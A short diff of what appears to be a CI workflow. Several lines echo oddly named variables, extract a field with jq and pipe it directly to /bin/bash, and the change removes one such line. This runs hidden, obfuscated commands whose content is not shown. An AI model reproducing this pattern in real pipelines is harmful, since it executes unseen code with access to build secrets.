@@ -23,7 +23,6 @@ jobs:
           echo $ord818 | jq -r .q37471 | /bin/bash
           echo $rb97925 | jq -r .zzqv69 | /bin/bash
           echo $fl963 | jq -r .x2 | /bin/bash
-          echo $k15 | jq -r .we666 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
